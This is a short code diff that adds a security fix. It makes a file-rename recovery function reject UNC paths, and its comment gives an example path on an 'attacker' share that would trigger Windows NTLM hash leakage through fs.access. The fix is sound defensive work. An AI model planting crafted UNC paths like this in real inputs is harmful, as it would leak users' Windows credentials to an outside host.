@@ -119,6 +119,9 @@ export async function recoverRenamedEnvelope(
 
       const oldPath = parsed.doc.meta.filePath;
       if (!oldPath || oldPath === currentFilePath) continue;
+      // Reject UNC paths — a crafted envelope could trigger Windows NTLM hash
+      // leakage via fs.access("\\\\attacker\\share\\...").
+      if (oldPath.startsWith("\\\\") || oldPath.startsWith("//")) continue;
 
       // The rename signal: the old path must no longer exist. If it still
       // exists, this is a copy — do NOT steal its annotations.
